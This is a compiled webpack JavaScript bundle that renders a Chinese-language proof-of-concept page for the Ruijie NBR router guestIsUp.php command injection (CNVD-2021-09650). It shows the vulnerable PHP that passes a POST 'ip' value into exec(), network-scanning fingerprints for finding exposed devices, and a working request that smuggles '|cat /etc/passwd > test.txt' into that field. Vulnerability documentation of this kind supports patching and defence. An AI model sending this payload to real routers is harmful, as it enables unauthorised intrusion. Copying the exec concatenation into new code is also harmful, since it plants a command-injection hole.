{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[244],{1840:function(t,s,a){\"use strict\";a.r(s);var n=a(56),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[n(\"h1\",{attrs:{id:\"锐捷-nbr-路由器-guestisup-php-远程命令执行漏洞-cnvd-2021-09650\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#锐捷-nbr-路由器-guestisup-php-远程命令执行漏洞-cnvd-2021-09650\"}},[t._v(\"#\")]),t._v(\" 锐捷 NBR 路由器 guestIsUp.php 远程命令执行漏洞 CNVD-2021-09650\")]),t._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞描述\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[t._v(\"#\")]),t._v(\" 漏洞描述\")]),t._v(\" \"),n(\"p\",[t._v(\"锐捷NBR路由器 EWEB网管系统部分接口存在命令注入，导致远程命令执行获取权限\")]),t._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞影响\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[t._v(\"#\")]),t._v(\" 漏洞影响\")]),t._v(\" \"),n(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"锐捷NBR路由器 EWEB网管系统\")]),n(\"br\"),t._v(\" \"),n(\"h2\",{attrs:{id:\"网络测绘\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#网络测绘\"}},[t._v(\"#\")]),t._v(\" 网络测绘\")]),t._v(\" \"),n(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v('title=\"锐捷网络-EWEB网管系统\"')]),n(\"br\"),t._v(\" \"),n(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v('icon_hash=\"-692947551\"')]),n(\"br\"),t._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞复现\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[t._v(\"#\")]),t._v(\" 漏洞复现\")]),t._v(\" \"),n(\"p\",[n(\"img\",{attrs:{src:a(867),alt:\"img\"}})]),t._v(\" \"),n(\"p\",[t._v(\"出现漏洞的文件在 \"),n(\"strong\",[t._v(\"/guest_auth/guestIsUp.php\")])]),t._v(\" \"),n(\"div\",{staticClass:\"language-php extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-php\"}},[n(\"code\",[n(\"span\",{pre:!0,attrs:{class:\"token php language-php\"}},[n(\"span\",{pre:!0,attrs:{class:\"token delimiter important\"}},[t._v(\"<?php\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[t._v(\"//查询用户是否上线了\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$userip\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\" @\"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$_POST\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),n(\"span\",{pre:!0,attrs:{class:\"token string single-quoted-string\"}},[t._v(\"'ip'\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$usermac\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\" @\"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$_POST\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),n(\"span\",{pre:!0,attrs:{class:\"token string single-quoted-string\"}},[t._v(\"'mac'\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n    \\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"if\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"!\")]),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$userip\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"||\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"!\")]),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$usermac\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),t._v(\"\\n        \"),n(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"exit\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[t._v(\"/* 判断该用户是否已经放行 */\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$cmd\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token string single-quoted-string\"}},[t._v(\"'/sbin/app_auth_hook.elf -f '\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\".\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$userip\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$res\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"exec\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$cmd\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$out\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$status\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[t._v(\"/* 如果已经上线成功 */\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"if\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"strstr\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),n(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$out\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"status:1\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),t._v(\"\\n        \"),n(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"echo\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token string single-quoted-string\"}},[t._v(\"'true'\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n    \"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token delimiter important\"}},[t._v(\"?>\")])]),t._v(\"\\n\")])])]),n(\"p\",[t._v(\"这里看到通过命令拼接的方式构造命令执行，\")]),t._v(\" \"),n(\"div\",{staticClass:\"language-shell extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[n(\"code\",[t._v(\"POST /guest_auth/guestIsUp.php\\n\"),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[t._v(\"mac\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"&\")]),n(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[t._v(\"ip\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"127.0\")]),t._v(\".0.1\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"cat\")]),t._v(\" /etc/passwd \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),t._v(\" test.txt\\n\")])])]),n(\"p\",[t._v(\"然后访问页面 \"),n(\"strong\",[t._v(\"/guest_auth/test.txt\")]),t._v(\" 就可以看到命令执行的结果\")]),t._v(\" \"),n(\"p\",[n(\"img\",{attrs:{src:a(868),alt:\"img\"}})]),t._v(\" \"),n(\"h2\",{attrs:{id:\"\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#\"}},[t._v(\"#\")])])],1)}),[],!1,null,null,null);s.default=e.exports},867:function(t,s,a){t.exports=a.p+\"assets/img/ruijie-6.186c7c09.png\"},868:function(t,s,a){t.exports=a.p+\"assets/img/ruijie-5.839614c8.png\"}}]);","extractedComments":[]}